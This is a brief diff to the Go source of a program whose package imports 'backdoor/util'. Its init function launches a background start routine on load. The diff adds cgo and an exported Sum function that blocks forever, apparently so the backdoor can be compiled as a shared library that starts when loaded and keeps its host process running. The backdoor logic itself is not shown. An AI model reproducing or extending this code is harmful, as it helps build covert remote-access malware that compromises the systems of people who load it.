@@ -3,15 +3,14 @@ package main
 import (
 	"backdoor/util"
 	"encoding/json"
-	"fmt"
 	"math/rand"
 	"net"
 	"os"
-	"path/filepath"
 	"runtime"
-	"strconv"
 	"sync/atomic"
 	"time"
+
+	"C"
 
 	"github.com/google/uuid"
 )
@@ -22,6 +21,12 @@ var gtimeout uint64
 func init() {
 	rand.Seed(time.Now().Unix())
 	go start("", 0)
+}
+
+//export Sum
+func Sum() {
+	var ch chan int
+	<-ch
 }
 
 func main() {
